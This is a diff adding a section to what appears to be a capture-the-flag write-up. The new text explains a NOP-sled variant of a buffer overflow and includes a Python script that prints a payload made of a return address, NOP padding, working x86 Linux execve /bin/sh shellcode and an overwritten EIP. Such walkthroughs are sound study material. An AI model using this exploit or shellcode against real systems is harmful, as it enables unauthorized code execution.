@@ -129,6 +129,20 @@ gdb-peda$ continue
 $ # We have got the shell !
 ```
 
+Another way could be to fill the padding with NOPSLED (\x90) and then point to an address inside this padding of NOP  
+The buffer starting at 0x0804a00c with 76 NOP (108 - 28 - 4), we can for example chose 16 bytes after and point at 0x0804a01c
+
+```python
+#!/usr/bin/python
+
+START = '\x1c\xa0\x04\x08'
+NOPSLED = '\x90' * (108 - 28 - 4)
+SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+EIP = '\x0c\xa0\x04\x08'
+
+print START + NOPSLED + SHELLCODE + EIP
+```
+
 Finally we can get the pass !
 
 ```shell
